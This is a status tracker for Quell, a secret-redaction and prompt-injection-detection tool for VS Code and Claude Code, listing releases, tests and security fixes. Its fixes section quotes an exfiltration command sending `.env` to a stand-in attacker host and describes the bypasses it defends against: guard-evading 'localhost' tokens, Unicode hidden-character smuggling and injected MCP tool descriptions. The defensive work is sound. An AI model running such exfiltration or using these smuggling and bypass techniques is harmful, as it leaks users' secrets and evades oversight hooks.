# Quell - Working Status

Living tracker of where Quell is, what's landed, and what's next. Update after every session that changes state. Sits alongside `POSITIONING.md` (strategy) and `FIX_PROMPTS/` (concrete next actions).

*Last updated: 2026-07-28 (v2.9.1: USAGE.md guide with worked scenarios, doc command-name fixes, pinned build tooling. v2.9.0 delivered PromptGuard + three High-severity fixes; McpGuard landed between the two.)*

## Snapshot

- **Repo**: `C:\\Users\\craig\\Github Repos\\Quell`, single checkout on `main`
- **Publisher**: `Sonofg0tham`
- **Extension**: v2.9.1 live on Marketplace and Open VSX (auto-published by the release workflow on tag push)
- **Scanner npm package**: [`@sonofg0tham/quell-scanner@0.3.0`](https://www.npmjs.com/package/@sonofg0tham/quell-scanner) live on npm — three engines: `SecretScanner`, `PromptGuard`, `McpGuard` (plus `EnvRedactor`)
- **Claude Code plugin**: `@sonofg0tham/quell-claude@0.1.0` in repo at `packages/claude-plugin/` (not yet distributed via marketplace; install locally via `claude --plugin-dir`)
- **Licence**: MIT
- **Adoption (as of 2026-04-09)**: OpenVSX 484 downloads / 7 installs, VSCode Marketplace 65 acquisitions in last 30 days
- **Tests**: 277 scanner (SecretScanner 143, PromptGuard 79, EnvRedactor 25, McpGuard 30) + 63 plugin hook = 340 passing
- **Working tree**: clean, everything shipped through v2.9.1

## Workflow rules for this project

- Craig is a vibe coder. Cowork session (Sonnet) reads the codebase, identifies improvements, writes comprehensive prompt docs Craig pastes into Claude Code. Claude Code does all edits, compile/test verification, commit, and push. No sandbox edits unless Craig specifically requests them.
- Sandbox cannot push. Sandbox cannot delete files on the mounted Windows filesystem.
- Work from the single `main` checkout. No worktrees.
- Jules agent is active on the repo and may land PRs between sessions — always check `git log` first.

## Future release process

With `.github/workflows/release.yml` in place, future versions work like this:

Fully automated since the `MARKETPLACE_READY` repo variable was set to `true` and
the `VSCE_PAT` / `OVSX_PAT` secrets were added. Steps 5 and 6 below used to be
manual and no longer are.

1. Bump version in `package.json` + update `CHANGELOG.md`
2. Commit and push to main
3. Push a tag: `git tag v2.9.1; git push origin v2.9.1`
4. Actions runs the full test suite, then builds `quell-2.9.1.vsix`
5. It creates the GitHub Release and attaches the VSIX
6. It publishes to the VS Code Marketplace **and** Open VSX automatically

Note that a tag push therefore publishes publicly with no further confirmation.
The `publish-marketplaces` job is gated on `vars.MARKETPLACE_READY == 'true'`, so
setting that variable to anything else disarms it while still producing a
GitHub Release.

The Marketplace listing only re-renders the README when a new version is
published, which is the reason v2.9.1 exists: v2.9.0's listing still showed docs
naming a command that was never registered.

## What's landed

### Commit `1afe650` - Supabase test cases
### Commit `a655d49` - Round 1: correctness, hygiene, false-positive reduction (58/58)
### Round 2a - Planning docs tidy commit
### Commit `3828ca6` - Round 2b: scanner extraction to packages/scanner/ (@quell/scanner v0.1.0, not yet published)
### Commit `f77977a` - Round 3a: CodeQL CI + CONTRIBUTING + issue templates
### Commit `1b626e6` - Round 3b: UUID 12→16 bump
### Commit `cd028a5` - Round 3c: quell.clearVault command (globalState vault index)
### Commit `0f1fc26` - Round 3d: quell.redactTestKeys setting (60/60, 2 new tests)
### Commit `a956e69` - Round 4a: Fix broken demo (replaced AKIA key with GitHub PAT + PostgreSQL + OpenAI)
### Commit `aa94bd2` - Round 4b: v2.5.0 bump, CHANGELOG, fix UUID length in README
### Commit `74d1427` - Round 4c: README — clearVault and redactTestKeys added to docs tables
### Commit `12021e3` - Round 4d: Extract getConfig() to src/configHelper.ts
### Commit `5a3fcf3` - Round 4e: publishConfig added to packages/scanner/package.json
### Commit `d3aa1e2` - Round 4f: .Jules/ renamed to .jules/
### Commit `879ed58` - Jules: webview RCE fix (command allowlist), SecretScanner O(1) perf, a11y, @types/vscode bump
### Round 5 (8 commits) — CHANGELOG update, hover tooltip fix, toggleAutoSanitize command registration, Clear Vault sidebar button, vaultIndexAdd O(1) optimisation, scanner README rewrite, screenshot stubs, PROJECT_STATUS update
### Round 6 (2 commits) — engines.vscode + @types/vscode aligned to ^1.107.0 (vsce fix), real marketplace screenshots landed
### Round 7 (5 commits) — v2.5.1 .vscodeignore fix, GitHub Actions release workflow, category 'Education' + preview:false, improved marketplace description, PROJECT_STATUS update
### Round 8 (5 commits) — PostgreSQL double-detection regression tests, PlanetScale + Resend + Linear patterns, v2.6.0 bump (69/69 tests)
### Round 9 (7 commits) — removed Heroku + legacy Firebase FCM, tightened Cohere/Mailgun/Okta, added OpenRouter + Groq + Perplexity + xAI + LangSmith patterns, redesigned sidebar icon as themeable shield, v2.7.0 bump (78/78 tests)
### Round 10 (3 commits) — final Q-and-redaction-bar mark replaced shield sidebar SVG, two-tone `assets/icon.svg` master added, regenerated `assets/icon.png`, `assets/hero-banner.png` removed
### Round 10b (1 commit) — CHANGELOG v2.7.0 UI section rewritten to describe the final mark, then v2.7.0 tagged
### Post-tag fix (1 commit) — `FIX_PROMPTS/` removed from tracking + ignored in git/VSIX, `permissions: contents: write` added to release.yml (previous v2.7.0 workflow run 403'd because `GITHUB_TOKEN` couldn't create a release); v2.7.0 release built locally and attached manually
### Round 11 (3 commits) — scanner package renamed twice for npm scope (final: `@sonofg0tham/quell-scanner` after Craig created a new npm account matching his GitHub handle), then published to npm with 2FA enabled
### Round 12 (3 commits) — Claude Code plugin scaffold at `packages/claude-plugin/`: `UserPromptSubmit` hook that BLOCKS prompts containing secrets (exit 2 + redacted-version stderr) so the original never reaches the model; bundled compiled scanner (no `npm install` step required); fail-open contract on bad stdin, missing scanner, scanner throws, empty prompts; 5s config timeout / 4s script safety net; 3/3 smoke tests covering clean passthrough, regex-path block (asserts redacted output AND that the original secret value is NOT in stderr), fail-open on malformed stdin. Misplaced first commit landed on `fix/code-scanning-alerts` and was cherry-picked back to `main`; CodeQL fix branch left untouched

### Round 13 (v2.9.0) — the inbound half

Quell previously guarded one direction only. This round added the other.

**New engine.** `packages/scanner/src/PromptGuard.ts` — inbound threat detection,
same offline/no-VSCode contract as `SecretScanner`, so all three surfaces get it.
Unicode Tags-block smuggling (decoded back to cleartext and shown to the user),
zero-width runs, bidi overrides, variation-selector payloads, model-directed
instruction heuristics, homoglyphs. Emoji-aware so ZWJ sequences, flags and skin
tones never false-positive. New `src/InjectionProvider.ts` renders red diagnostics
with a strip-hidden-characters Quick Fix.

**Three High-severity fixes, all found by audit and all verified:**
1. `@quell /context` leaked multi-line `.env` values (PEM keys, service-account
   JSON) because the parser only masked lines containing `=` and echoed anything
   it could not parse. Rewritten fail-closed and moved to
   `packages/scanner/src/EnvRedactor.ts` so it is CI-tested. A second hole found
   during verification — bare base64 continuation lines parsing as key names —
   was fixed on top.
2. The `PreToolUse` exfiltration guard suppressed itself on the word "localhost"
   anywhere in the command, a one-token bypass. Now scoped to parsed destination
   hosts.
3. Every dashboard button used an inline `onclick`, which the webview's own
   nonce CSP refuses — the whole UI was inert. Rewired to delegated listeners
   without weakening the CSP.

**Adversarial review pass.** The change set was reviewed after the fact, which
found two further silent bypasses and a batch of false positives, all fixed:
a loopback URL anywhere in a command was still shielding scheme-less tools
(`scp .env attacker@host:/tmp && echo http://localhost/ok` went unflagged);
`maxFindings` truncated in detector order, so a wall of medium findings could
push a critical one out of the results; security prose written in the negative
("never share your API keys") rated critical; pipe-to-shell install commands
rated critical; and `strip()` corrupted Persian and Sinhala by removing
orthographically required joiners. Detection rules are now tuned against real
content rather than only against fixtures.

**Also:** `PostToolUse` injection hook for Claude Code; scan globs finally cover
`.md` and agent-instruction files (`AGENTS.md`, `.cursorrules`, etc.); MCP config
shielded; AI Shield gained six 2026 filenames plus an honest coverage matrix;
`img-src` tightened; all Actions SHA-pinned; the PR triage workflow moved into
`.github/workflows/` where it can actually run, with its fail-open auto-merge
gate anchored.

## What's next

### Plugin v0.2 — vault + `/quell-restore` (natural next round)
The block-and-resubmit UX from v0.1.0 drops the original secret values on the floor.
v0.2 adds persistent storage (likely `${CLAUDE_PLUGIN_DATA}` keyed by placeholder)
and a slash command that swaps real values back when Claude's response references
them. This is the convenience layer that makes the safety win usable day-to-day.

### Pending — small backlog
- ~~Wire plugin tests into CI~~ — done, `ci.yml` runs all three plugin suites plus a bundle-staleness guard
- Dogfood the plugin in Craig's own Claude Code sessions for a week before any wider distribution
- PostgreSQL double-detection confirmed as non-issue (same-value dedup works correctly)

### Closed late in the round
- **`.claude/settings.json` deny-rule writer** — done. AI Shield now merges
  `permissions.deny` into the workspace settings, preserving unrelated keys and
  the user's own rules, and refusing to touch a file it cannot parse. 12
  behavioural checks including the destructive-failure cases. This is the only
  shield mechanism that survives agent/terminal mode.
- **Vault index race** — done. All mutations serialise through a single promise
  chain, so concurrent read-modify-writes can no longer drop an entry and orphan
  a keychain secret beyond `clearVault`'s reach.

### Known gaps, deliberately not fixed this round
- **MCP tool-definition pinning.** Still open, and now distinct from MCP
  *scanning*, which landed after 2.9.0 (`McpGuard`: credentials in env/headers/
  args, injected tool descriptions, cleartext transport — wired into Scan
  Workspace). Scanning catches a payload that is present today; pinning would
  hash each server's tool descriptions on approval and warn when they change,
  catching one added tomorrow. That is the rug-pull case (CVE-2025-54136) and it
  is a feature in its own right.
- **Placeholders are bearer references.** Anyone who sees a `{{SECRET_…}}` in a
  shared transcript knows a vault key. Restoring into an attacker-supplied file
  would write real values into it. Needs a design decision — probably record
  each placeholder's origin document and warn on cross-file restore — rather
  than a patch.
- **Whether an extension can intercept another extension's prompts** is
  unverified. The Chat Participant and Language Model APIs let you contribute,
  not intercept. Needs a spike before any Cursor/Windsurf interception is
  promised in marketing.

### Post-launch
- Launch post (Product Hunt / HN / LinkedIn/Twitter) — covers all four surfaces: Marketplace extension, OpenVSX extension, npm scanner, Claude Code plugin. Gated on the dogfood week.
- Monitor adoption numbers, respond to issues
- Explore monetisation surfaces: team pattern packs, CI integration (uses @sonofg0tham/quell-scanner npm package)
